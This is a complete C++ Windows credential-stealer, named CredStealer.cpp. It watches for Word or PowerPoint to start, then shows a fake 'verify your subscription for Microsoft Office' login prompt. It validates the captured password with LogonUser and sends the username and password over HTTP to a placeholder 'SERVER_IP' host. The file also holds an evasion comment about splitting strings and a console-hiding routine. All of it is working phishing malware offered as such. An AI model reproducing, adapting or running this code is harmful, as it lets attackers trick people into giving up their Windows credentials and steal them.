// CredStealer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <wincred.h>
#include <tlhelp32.h>
#include <string>
#include <stdio.h>
#include <wininet.h>
#include <thread>
#include <chrono>


#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "wininet.lib")
// split it into smaller chunks to evade strings tools
const wchar_t* Oword = L"WINWORD.EXE";
const wchar_t* Pword = L"POWERPNT.EXE";
bool CheckCreds(std::wstring username , std::wstring password) {
    HANDLE HLogon;
    if (LogonUser(username.c_str(), NULL, password.c_str(),
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        &HLogon
    ) != 0) {
        CloseHandle(HLogon);
        return true;
    }
    else {
        CloseHandle(HLogon);
        return false;
    }

}
void ExfilCreds(std::wstring username, std::wstring password) {
    PCTSTR headers[] = { TEXT("application/x-www-form-urlencoded"), NULL };
    LPCWSTR host = TEXT("SERVER_IP");//server ip
    std::wstring wUrl = L"username=" + username + L"&password=" + password;
    LPCWSTR url = wUrl.c_str();

    HINTERNET hSession, hConnect, hFile;

    if ((hSession = InternetOpen(
        LPCWSTR("CredStealerMalware"),
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    )) == NULL)
    {
        exit(1);
    }


    if ((hConnect = InternetConnect(
        hSession,
        host,
        INTERNET_DEFAULT_HTTP_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    )) == NULL)
    {
        exit(1);
    }


    if ((hFile = HttpOpenRequest(
        hConnect,
        NULL,
        url,
        NULL,
        NULL,
        headers,
        INTERNET_FLAG_RELOAD,
        0
    )) == NULL)
    {
        exit(1);
    }
    //sending request
    bool res = HttpSendRequest(hFile, NULL, NULL, NULL, NULL);
    if (!res)
    {
        exit(1);
    }

}
bool GetCreds() {
    CREDUI_INFO cui;
    TCHAR username[CREDUI_MAX_USERNAME_LENGTH + 1];
    TCHAR password[CREDUI_MAX_PASSWORD_LENGTH + 1];
    BOOL save;
    DWORD dwErr;

    cui.cbSize = sizeof(CREDUI_INFO);
    cui.hwndParent = NULL;
    cui.pszMessageText = TEXT("Please verify your subscription for Microsoft Office");
    cui.pszCaptionText = TEXT("Enter your credentials");
    cui.hbmBanner = NULL;
    save = FALSE;
    SecureZeroMemory(username, sizeof(username));
    SecureZeroMemory(password, sizeof(password));
    dwErr = CredUIPromptForCredentialsW(
            &cui,
            TEXT("TheServer"),

            NULL,
            0,
            username,
            CREDUI_MAX_USERNAME_LENGTH + 1,
            password,
            CREDUI_MAX_PASSWORD_LENGTH + 1,
            &save,
            CREDUI_FLAGS_GENERIC_CREDENTIALS |
            CREDUI_FLAGS_ALWAYS_SHOW_UI |
            CREDUI_FLAGS_INCORRECT_PASSWORD |
            CREDUI_FLAGS_DO_NOT_PERSIST);
        if (!dwErr)
        {
            //  Put code that uses the credentials here.
            //  When you have finished using the credentials,
            //  erase them from memory.
            if (CheckCreds(username, password)) {
                ExfilCreds(username, password);
                SecureZeroMemory(username, sizeof(username));
                SecureZeroMemory(password, sizeof(password));
                return true;
            }

            SecureZeroMemory(username, sizeof(username));
            SecureZeroMemory(password, sizeof(password));
            return false;
        }
        if (dwErr == ERROR_CANCELLED) {
            SecureZeroMemory(username, sizeof(username));
            SecureZeroMemory(password, sizeof(password));
            return false;
        }
 
}
bool EnumerateProcs() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 processEntry;
    bool ContainsWord = false;
    //DWORD dwPriorityClass;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    //enumerate through all processes
    do
    {
        //check if any of the processes is WINWORD.exe

        if ((wcscmp(processEntry.szExeFile, Oword) == 0) || (wcscmp(processEntry.szExeFile, Pword)) == 0) {
            return true;
        }
        else {
            ContainsWord = false;
        }

    } while (Process32Next(hProcessSnap, &processEntry));

    CloseHandle(hProcessSnap);
    return ContainsWord;

}
void HideConsole() {
    HWND hide;
    AllocConsole();
    hide = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hide, 0);
}
int main()
{   //hide console
    //HideConsole();
    while (true) {

        if (!EnumerateProcs()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
            continue;
        }
        else {
            if (!GetCreds()) {
                //pause for 5 seconds
                std::this_thread::sleep_for(std::chrono::milliseconds(5000));
                continue;
            }
            else {
                break;
              
            }
        }
    }
    exit(1);
}
